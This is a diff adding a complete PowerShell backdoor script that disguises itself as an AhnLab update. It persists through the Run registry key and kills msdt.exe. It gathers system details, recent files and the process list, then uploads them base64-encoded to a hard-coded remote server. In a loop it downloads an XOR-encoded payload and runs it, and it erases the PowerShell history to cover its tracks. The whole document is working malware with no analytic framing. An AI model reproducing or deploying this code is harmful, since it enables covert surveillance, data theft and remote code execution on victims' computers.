@@ -1,0 +1,131 @@
+$TIME_VALUE = 60*30
+$RegValueName = "AhnlabUpdate"
+$RegKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+function decode($e)
+{		
+	$l = $e.Length
+	$j = 0
+	$i = 0
+	$c = ""
+	$k = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6) 
+	while($i -lt $l)
+	{
+		$j = $j % 160
+		
+		$a = $e[$i] -bxor $k[$j]
+		$d = [char]$a
+		$c += $d
+		$j++
+		$i++
+	}
+
+	return $c
+}
+$SERVER_ADDR = "http://oijnk.mypressonline.com/"
+$UP_URI = "post.php"
+$upName = "1"
+$LocalID = "1"
+$LOG_FILENAME = "Ahnlab.hwp"
+$LOG_FILEPATH = "\Ahnlab\"
+function UpLoadFunc($logpath)
+{
+	$Url = $SERVER_ADDR + $UP_URI
+	$bReturn = $True
+	$testpath = Test-Path $logpath
+	if($testpath -eq $False)
+	{
+		return $bReturn
+	}
+	
+	$hexdata =[IO.File]::readalltext($logpath)
+	$bytes = [System.Text.Encoding]::UTF8.GetBytes($hexdata)
+	$base64 = [System.Convert]::ToBase64String($bytes)
+
+	Invoke-WebRequest -Uri $Url -Method Post -Body "result=$base64"
+	
+	return $bReturn
+}
+function FileUploading($upPathName)
+{
+	$bRet = $True
+	$testpath = Test-Path $upPathName
+	if($testpath -eq $False)
+	{
+		return $bRet
+	}
+	$UpL = UpLoadFunc $upPathName
+	if($UpL -eq $False)
+	{
+		echo "UpLoad Fail!!!"
+		$bRet = $False
+	}
+	else
+	{
+		echo "Success!!!"
+	}
+	del $upPathName
+	return $bRet
+}
+function Download
+{
+	$downname = $LocalID + ".down"
+	$delphppath = $SERVER_ADDR + "del.php"
+	$downpsurl = $SERVER_ADDR + $downname
+	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
+	$comletter = decode $codestring
+	
+	$decode = $executioncontext.InvokeCommand.NewScriptBlock($comletter)
+	$RunningJob = Get-Job -State Running
+	if($RunningJob.count -lt 3)
+	{
+		$JobName = $RunningJob.count + 1
+		Start-Job -ScriptBlock $decode -Name $JobName
+	}
+	else
+	{
+		$JobName = $RunningJob.count
+		Stop-Job -Name $RunningJob.Name
+		Remove-Job -Name $RunningJob.Name
+		Start-Job -ScriptBlock $decode -Name $JobName
+	}
+	$down_Server_path = $delphppath + "?filename=$LocalID"
+	$response = [System.Net.WebRequest]::Create($down_Server_path).GetResponse()
+	$response.Close()
+}
+function Get_info($logpath)
+{
+	Get-ChildItem ([Environment]::GetFolderPath("Recent")) >> $logpath
+	dir $env:ProgramFiles >> $logpath
+	dir "C:\Program Files (x86)" >> $logpath
+	systeminfo >> $logpath
+	tasklist >> $logpath
+	Get-PSDrive -PSProvider FileSystem >> $logpath
+}
+
+function main
+{
+	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+        $cmd = "c:\windows\system32\cmd.exe";
+        Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";
+	$Fh = $env:APPDATA + $LOG_FILEPATH
+	New-Item -Path $Fh -Type directory -Force
+	$szLoh = $Fh + $LOG_FILENAME
+	$key = Get-Item -Path $RegKey
+	$ex = $key.GetValueNames() -contains $RegValueName
+	if($ex -eq $False)
+	{
+		$v1 = New-ItemProperty -Path $RegKey -Name $RegValueName
+		Get_info $szLoh
+	}
+	while ($true)
+	{
+		FileUploading $szLoh
+		Start-Sleep -s 10
+		Download
+		Start-Sleep -s 10
+		del "$env:appdata\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+		Start-Sleep -s $TIME_VALUE
+	}
+	
+}
+main
